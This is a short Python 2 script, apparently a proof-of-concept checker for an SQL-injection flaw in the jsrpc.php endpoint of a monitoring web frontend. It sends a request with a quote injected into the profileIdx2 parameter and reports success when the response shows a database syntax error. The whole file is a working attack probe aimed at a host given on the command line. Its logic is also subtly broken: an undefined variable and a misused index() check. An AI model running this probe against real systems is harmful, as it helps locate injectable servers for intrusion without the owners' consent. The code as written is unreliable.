#coding:utf-8

import sys, urllib2


def audit():
    pass

if __name__ == '__main__':
    if len(sys.argv) == 2:
        host = sys.argv[1]
    else:
        print '[PARAM]'
    target = host+"/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    content = urllib2.urlopen(url=target).read()
    # print content
    if content.index('You have an error in your SQL syntax') != -1:
        print '[SUCCESS]'
    else:
        print '[FAILS]'

